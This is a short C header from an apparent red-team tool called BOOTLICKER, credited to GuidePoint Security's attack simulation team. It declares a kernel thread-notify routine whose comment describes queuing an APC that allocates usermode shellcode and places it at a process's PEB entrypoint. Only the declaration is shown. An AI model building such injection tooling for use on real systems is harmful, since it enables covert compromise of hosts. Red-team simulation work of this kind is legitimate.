/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Determines if the host process is the target to 
 * insert an APC. The APC will then create allocate 
 * the usermode shellcode, and insert it within the
 * PEB entrypoint.
 *
!*/
D_SEC( D ) VOID WINAPI ThreadNotifyRoutine( _In_ HANDLE ProcessId, _In_ HANDLE ThreadId, _In_ BOOLEAN Create );
